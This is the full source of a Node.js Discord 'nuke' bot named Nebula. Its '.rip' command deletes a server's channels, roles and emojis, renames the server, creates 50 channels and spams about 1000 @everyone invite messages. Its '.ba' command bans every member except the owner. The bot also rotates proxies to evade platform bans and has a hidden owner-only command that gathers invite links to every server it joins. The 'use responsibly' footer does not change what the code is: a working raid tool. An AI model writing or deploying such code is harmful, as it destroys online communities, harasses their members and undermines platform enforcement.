const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');
dotenv.config();

// ====== LOAD PROXIES FROM FILE ======
let proxies = [];
try {
  const data = fs.readFileSync('./proxies.txt', 'utf-8');
  proxies = data
    .split('\n')
    .map(line => line.trim())
    .filter(line => line && /^https?:\/\//i.test(line));
  console.log(`✅ Loaded ${proxies.length} proxies.`);
} catch (err) {
  console.warn('⚠️ proxies.txt not found or invalid:', err.message);
}

// Helper: Get random proxy agent
function getRandomProxyAgent() {
  if (proxies.length === 0) return null;
  const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
  try {
    return new HttpsProxyAgent(proxyUrl);
  } catch (err) {
    console.warn(`⚠️ Invalid proxy format: ${proxyUrl}`);
    return null;
  }
}

// ====== WEB SERVER FOR KEEP-ALIVE ======
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});
app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ],
  // Apply proxy globally if available
  agent: proxies.length > 0 ? { https: getRandomProxyAgent() } : undefined
});

// ====== RATE LIMIT HANDLER (OPTIMIZED) ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      const result = await promiseFn();
      return result;
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 1000);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
      } else if (error.code === 401 || error.code === 403) {
        // Token invalid or banned – don't retry
        console.error('❌ Authentication error:', error.message);
        throw error;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  console.error('❌ Max retries reached.');
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  if (!guild || !guild.available || !guild.members.me) return;
  try {
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Successfully left the server.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked.');
    } else {
      console.error('⚠️ Error leaving:', err.message);
    }
  }
}

client.on('ready', () => {
  const agentUsed = client.options.agent?.https
    ? `via proxy ${client.options.agent.https.proxy.href}`
    : 'direct';
  console.log(`🚀 Logged in as ${client.user.tag} ${agentUsed}`);
});

// ====== MESSAGE HANDLER ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Here are the available commands for Nebula Bot:')
      .addFields(
        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
        { name: '.ba', value: 'Bans all members (except owner)' },
        { name: '.help', value: 'Sends this help to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly - only in servers you own!' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.reply('📬 Sent help to your DMs!');
    } catch (err) {
      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
    }
    return;
  }

  // ===== SERVERS COMMAND (Owner Only) =====
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') {
      return message.reply('❌ You are not authorized to use this command.');
    }

    await message.reply('📬 Fetching server list...');

    const serverList = await Promise.all(client.guilds.cache.map(async (guild) => {
      try {
        const owner = await handleRateLimit(() => guild.fetchOwner());
        const invites = await handleRateLimit(() => guild.invites.fetch());
        const invite = invites.first()?.url || 'No active invite';
        return { name: guild.name, id: guild.id, owner: owner.user.tag, invite };
      } catch (err) {
        return { name: guild.name, id: guild.id, error: 'No permissions' };
      }
    }));

    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers I\'m In')
      .setDescription(`Total: ${serverList.length}`)
      .setColor('#00ffff');

    for (let i = 0; i < Math.min(serverList.length, 25); i++) {
      const s = serverList[i];
      embed.addFields({
        name: `${i + 1}. ${s.name}`,
        value: s.error
          ? `ID: ${s.id}\n⚠️ ${s.error}`
          : `Owner: ${s.owner}\nID: ${s.id}\n🔗 [Join](${s.invite})`
      });
    }

    try {
      await message.author.send({ embeds: [embed] });
      if (serverList.length > 25) {
        let page = 2;
        for (let i = 25; i < serverList.length; i += 25) {
          const pageEmbed = new EmbedBuilder()
            .setTitle(`🌐 Servers (Page ${page++})`)
            .setColor('#00ffff');
          serverList.slice(i, i + 25).forEach(s => {
            pageEmbed.addFields({
              name: s.name,
              value: s.error
                ? `ID: ${s.id}\n⚠️ ${s.error}`
                : `Owner: ${s.owner}\nID: ${s.id}\n🔗 [Join](${s.invite})`
            });
          });
          await message.author.send({ embeds: [pageEmbed] });
        }
      }
      await message.reply('✅ Server list sent to your DMs!');
    } catch (err) {
      await message.reply('❌ Could not send DMs. Check your privacy settings.');
    }
    return;
  }

  // Block .ba and .rip in specific server
  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 This command is disabled in this server.');
  }

  // ===== BAN ALL COMMAND =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BAN_MEMBERS')) {
      return message.reply("❌ You don't have permission to ban members.");
    }

    const guild = message.guild;
    const ownerID = guild.ownerId;

    await message.channel.send("🔍 Fetching all members...");

    let allMembers;
    try {
      allMembers = await guild.members.fetch();
    } catch (err) {
      return message.reply(`❌ Failed to fetch members: ${err.message}`);
    }

    const membersToBan = allMembers.filter(m =>
      m.id !== ownerID && !m.user.bot && m.bannable
    );

    if (membersToBan.size === 0) {
      return message.reply('❌ No bannable members found.');
    }

    await message.reply(`🔪 Banning ${membersToBan.size} members...`);
    let bannedCount = 0;

    for (const member of membersToBan.values()) {
      await handleRateLimit(() => guild.members.ban(member, {
        reason: 'Nebula Ban All',
        deleteMessageSeconds: 604800
      })).then(() => bannedCount++).catch(() => {});

      await new Promise(r => setTimeout(r, 50)); // Small delay to smooth load
    }

    await message.reply(`✅ Successfully banned ${bannedCount} members.`);
    return;
  }

  // ===== RIP COMMAND =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    const channelName = 'neb-was-here';
    let didSomething = false;
    let sent = 0;

    try {
      // Step 1: Delete channels
      await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})));
      didSomething = true;

      // Step 2: Delete roles
      await Promise.all(guild.roles.cache.map(r => {
        if (r.name !== '@everyone' && !r.managed) {
          return handleRateLimit(() => r.delete()).catch(() => {});
        }
      }));
      didSomething = true;

      // Step 3: Delete emojis
      await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {})));
      didSomething = true;

      // Step 4: Rename server
      await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' })).catch(() => {});
      didSomething = true;

      // Step 5: Create 50 channels
      const createdChannels = [];
      for (let i = 0; i < 50; i++) {
        const channel = await handleRateLimit(() =>
          guild.channels.create({ name: `${channelName}-${i + 1}` })
        ).catch(() => null);
        if (channel) createdChannels.push(channel);
      }

      if (createdChannels.length === 0) {
        await message.channel.send('❌ Failed to create any channels.');
        return;
      }

      // Step 6: Spam 1000 messages (20 per channel)
      const MAX_MESSAGES = 1000;
      const sendPromises = createdChannels.map(channel => async () => {
        for (let i = 0; i < 20 && sent < MAX_MESSAGES; i++) {
          await handleRateLimit(() => channel.send(spamMessage)).catch(() => {});
          sent++;
          await new Promise(r => setTimeout(r, 2)); // Minimal delay
        }
      });

      await Promise.all(sendPromises.map(fn => fn()));

      if (sent >= 950) await safeLeaveGuild(guild);

      await message.channel.send(`✅ Nuked successfully. Sent ${sent} messages.`);
    } catch (err) {
      await message.channel.send(`❌ Error during nuke: \`${err.message}\``);
    }
  }
});

// ====== LOGIN WITH PROXY FALLBACK ======
async function loginWithRetry(token, attempts = 3) {
  for (let i = 0; i < attempts; i++) {
    const agent = getRandomProxyAgent();
    const clientWithProxy = new Client({
      intents: client.options.intents,
      agent: agent ? { https: agent } : undefined
    });

    const proxyInfo = agent ? ` via proxy ${agent.proxy.href}` : ' (direct)';
    console.log(`🔁 Attempt ${i + 1}${proxyInfo}...`);

    try {
      await clientWithProxy.login(token);
      console.log(`🎉 Successfully logged in${proxyInfo}`);
      Object.assign(client, clientWithProxy);
      return;
    } catch (err) {
      console.error(`❌ Login failed${proxyInfo}:`, err.message.slice(0, 100));
      if (i === attempts - 1) break;
      await new Promise(r => setTimeout(r, 3000));
    }
  }

  // Final fallback: direct connection
  console.log('🔁 All proxy attempts failed. Falling back to direct connection...');
  await client.login(process.env.TOKEN).catch(err => {
    console.error('❌ Direct login failed:', err.message);
  });
}

// Start login process
const token = process.env.TOKEN;
if (!token) {
  console.error('❌ No token found in .env file!');
} else {
  loginWithRetry(token);
}
